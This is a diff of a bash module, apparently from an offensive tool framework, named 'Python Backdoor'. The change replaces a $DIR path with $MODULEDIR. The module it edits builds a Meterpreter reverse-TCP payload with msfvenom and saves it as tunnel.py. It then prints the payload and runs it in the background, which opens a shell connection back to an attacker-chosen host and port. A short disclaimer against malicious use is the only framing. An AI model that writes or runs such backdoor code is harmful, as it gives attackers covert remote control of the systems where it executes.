@@ -1,12 +1,11 @@
 #!/bin/bash 
 # Module Header
 MODULENAME="Python Backdoor"
-MODULEVERS="1.0"
+MODULEVERS="1.1"
 MODULECRED="REDD"
 modcreds;
 # End of Module Header
 
-DIR=$HOME/netup/modules
 # DISCLAIMER:
 # PLEASE DO NOT... DO NOT... I REPEAT... DO... NOT... USE THIS FOR
 # MALICIOUS PURPOSES OR MALINTENT. I,(-REDD- or Private-Locker)
@@ -43,20 +42,20 @@ fi
 echo -e "";
 if [[ "$TEMPTUNNEL" == "YES" ]] ; then
        mod_checkg "Temporary Tunnel is ACTIVE..";
-       if [ ! -f "$DIR/tunnel.py" ]; then
+       if [ ! -f "$MODULEDIR/tunnel.py" ]; then
                 mod_error "No Tunnel to remove.";
        else
                 mod_noti "Removing old copy of tunnel.py..";
-                rm -rf $DIR/tunnel.py
+                rm -rf $MODULEDIR/tunnel.py
        fi
 else
         mod_status "Temporary Tunnel is DEACTIVE..";
 fi
 echo -e "";
-if [ ! -f "$DIR/tunnel.py" ]; then
+if [ ! -f "$MODULEDIR/tunnel.py" ]; then
         mod_noti "Creating Tunnel to execute on Local System to $HOST.";
         mod_error " --> This Process can take a few minutes.. <--";
-        msfvenom -p python/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -a python --platform python -f raw -o $DIR/tunnel.py > /dev/null 2>&1 &
+        msfvenom -p python/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -a python --platform python -f raw -o $MODULEDIR/tunnel.py > /dev/null 2>&1 &
         BACK_PID=$!
         printf "\x20\x20\x20\x20\x1B[01;34m[\x3E]\x1B[0m Please Wait."
         while kill -0 $BACK_PID > /dev/null 2>&1 ; do
@@ -67,14 +66,14 @@ if [ ! -f "$DIR/tunnel.py" ]; then
         mod_checkg "Completed!";
 else
         mod_noti "Using old tunnel.py.."
-        mod_noti "Location: $DIR/tunnel.py"
-        mod_error " -- REMOVE OLD $DIR/tunnel.py TO CREATE NEW TUNNEL --";
+        mod_noti "Location: $MODULEDIR/tunnel.py"
+        mod_error " -- REMOVE OLD $MODULEDIR/tunnel.py TO CREATE NEW TUNNEL --";
 fi
 echo -e "";
 mod_noti "Showing content of tunnel.py.. ->";
-PRINTCONTENT=$(cat $DIR/tunnel.py)
+PRINTCONTENT=$(cat $MODULEDIR/tunnel.py)
 echo -e "$PRINTCONTENT";
 echo -e "";
 mod_noti "Executing Tunnel..";
-/usr/bin/python $DIR/tunnel.py &
+/usr/bin/python $MODULEDIR/tunnel.py &
 mod_checkg "Tunnel has started back to $HOST on port $PORT.";
